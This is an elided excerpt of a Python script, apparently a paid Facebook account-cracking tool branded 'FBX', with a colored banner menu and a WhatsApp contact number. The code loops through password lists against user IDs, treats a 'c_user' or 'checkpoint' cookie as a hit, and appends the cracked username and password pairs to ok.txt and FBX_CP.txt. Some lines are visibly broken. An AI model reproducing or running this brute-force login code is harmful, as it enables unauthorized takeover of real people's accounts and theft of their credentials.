...
def main():
    ...
    print('\033[1;32m        ┌─────────┐') 
    print("\033[1;92m\t│\033[1;31mMAIN MENU\033[1;92m│")
    print('\033[1;32m┌────────────────────────────────────────────┐') 
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mFBX-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				print('\r\033[1;31m[\033[1;30mFBX-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[FBX-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('FBX_CP.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					...
					pass
				print('\r\033[1;91m[FBX-CP] %s | %s%s      ' % (user,pw,tahun(user)))
...
def publiccrack():
    ...
    os.system('clear')
    print(banner)
    os.system('FBX .psy1.txt')
    os.system('FBX .psy2.txt')
...
class __cracking__:
	def __init__(self):
		...
		if not os.path.exists("access_token.txt"):
			login()
	def plerr(self):
		os.system("clear");print(banner);access_token = open('access_token.txt','r').read();dill=[];os.system("FBX .publicout.txt")
...
class load:
    def __init__(self):
        ...
        print('\n')
banner = """
               \033[1;31m:\033[1;32md88888b d8888b. db    db  
               \033[1;31m:\033[1;32m88'     88  `8D `8b  d8' 
               \033[1;31m:\033[1;32m88ooo   88oooY'  `8bd8'  
               \033[1;31m:\033[1;32m88~~~   88~~~b.  .dPYb.  
               \033[1;31m:\033[1;32m88      88   8D .8P  Y8. 
               \033[1;31m:\033[1;32mYP      Y8888P' YP    YP
\033[1;32m┌────────────────────────────────────────────────┐
\033[1;32m│\033[1;31m➣\033[1;37m AUTHOR  \033[1;31m:\033[1;32m FBX│\033[1;37m• \033[1;36mTHIS TOOL IS PAID \033[1;37m•\033[1;32m │
\033[1;32m│\033[1;31m➣\033[1;37m FACEBOOK\033[1;31m:\033[1;32m FBX│\033[1;37m• \033[1;36mONLY PK PACKAGE   \033[1;37m• \033[1;32m│
\033[1;32m│\033[1;31m➣\033[1;37m WHATSAPP\033[1;31m:\033[1;32m +923187475117  │\033[1;32m──────────────────────\033[1;32m│
\033[1;32m│\033[1;31m➣\033[1;37m GITHUB  \033[1;31m:\033[1;32m Secret│\033[1;37m  • │
\033[1;32m└────────────────────────────────────────────────┘
